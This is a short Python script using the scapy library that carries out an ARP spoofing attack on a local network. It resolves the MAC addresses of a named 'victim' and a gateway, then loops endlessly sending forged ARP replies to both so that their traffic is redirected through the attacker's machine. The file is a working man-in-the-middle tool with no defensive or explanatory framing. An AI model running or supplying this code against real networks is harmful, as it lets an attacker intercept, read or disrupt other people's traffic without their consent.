import scapy.all as scapy
import argparse
from scapy.layers.l2 import ARP, Ether
import time


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", required=True)
    parser.add_argument("-g", "--gateway", required=True)
    parser.add_argument("-i", "--interface", required=True)
    return parser.parse_args()


def get_mac(ip_addr):
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
    ans, _ = scapy.srp(p, timeout=3)
    return ans[0][1].hwsrc


def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac, my_mac):
    # packet_1 = ARP(pdst=dst_ip, psrc=vict_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=vict_mac)
    # packet_2 = ARP(pdst=vict_ip, psrc=dst_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=dst_mac)
    while True:
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=my_mac), count=7)
        scapy.send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=my_mac), count=7)
        time.sleep(2)


def main():
    options = args()
    my_mac = scapy.get_if_hwaddr(iff=options.interface)
    gateway_mac = get_mac(options.gateway)
    #dst_mac = scapy.get_if_hwaddr(options.interface)
    victim_mac = get_mac(options.victim)
    spoof(options.victim, victim_mac, options.gateway, gateway_mac, my_mac)


if __name__ == "__main__":
    main()
